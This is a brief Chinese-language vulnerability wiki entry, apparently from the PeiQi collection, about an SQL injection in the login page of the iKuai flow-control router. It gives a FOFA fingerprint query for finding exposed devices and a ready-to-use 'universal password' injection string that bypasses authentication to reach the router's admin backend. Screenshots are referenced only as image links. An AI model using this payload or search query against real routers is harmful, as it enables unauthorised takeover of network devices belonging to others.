---
title: iKuai 流控路由 SQL注入漏洞
date: 2021-09-23 23:55:51
tags: PeiQi文库
categories:
 - 网络设备漏洞
 - iKuai
---

# iKuai 流控路由 SQL注入漏洞

## 漏洞描述

iKuai 流控路由 存在SQL注入漏洞，可以通过SQL注入漏洞构造万能密码获取路由器后台管理权限

## 漏洞影响

> [!NOTE]
>
> iKuai 流控路由

## FOFA

> [!NOTE]
>
> title="登录爱快流控路由"

## 漏洞复现

登录页面如下

![image-20210531180103698](/img/20210924020255599617.png)

使用万能密码登录后台

```
user: "or""=""or""="
pass: 空
```

![image-20210531180212296](/img/20210924020256759646.png)